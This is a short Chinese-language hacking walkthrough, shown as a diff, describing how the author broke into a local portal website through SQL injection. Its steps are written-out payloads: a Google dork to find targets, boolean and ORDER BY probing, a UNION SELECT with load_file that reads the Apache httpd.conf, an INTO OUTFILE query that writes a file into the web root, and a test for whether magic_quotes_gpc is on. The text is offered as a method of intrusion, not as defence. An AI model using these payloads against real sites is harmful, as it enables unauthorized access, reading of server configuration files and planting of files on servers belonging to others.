@@ -1,0 +1,34 @@
+
+入侵某地方门户加PR
+
+个人比较喜欢日PHP，于是在GG搜索inurl:.php site:xxxxxxx.com
+
+inurl:.php site:http://www.xxxxxxx.com/，
+
+发现一个PHP的点，
+
+and 1=1 和 and 1=2，
+
+order by 6/*  发现有6个表，
+
+and 1=2 union select 1,2,3,4,5,6/*
+
+显示出2
+
+知道路径
+
+读下APACHE的配置文件：/usr/local/apache2/conf/httpd.conf，转换后
+
+访问：and 1=2 union select 1, load_file%28char%2847,117,115,114,47,108,111,99,97,108,47,97,112,97,99,104,101,50,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102%29%29,3,4,5,6/*
+
+然后搜索关键字htdocs找到目录为/www/xxxxxx.com/www/，用工具看了下，
+
+发现magic_quotes_gpc=Off。这样好，可以用OUTFILE INTO写文件进去
+
+/**/and/**/1=2/**/union/**/select/**/1,2,3,4,'byyzy',6 from user intooutfile
+'/www/xxxxxx.com/www/yzy.txt'/*
+这样文件就写上去了。
+
+判断gpc有一个很简单的方法
+and '1'='1'
+正常返回就是off，出错就是on
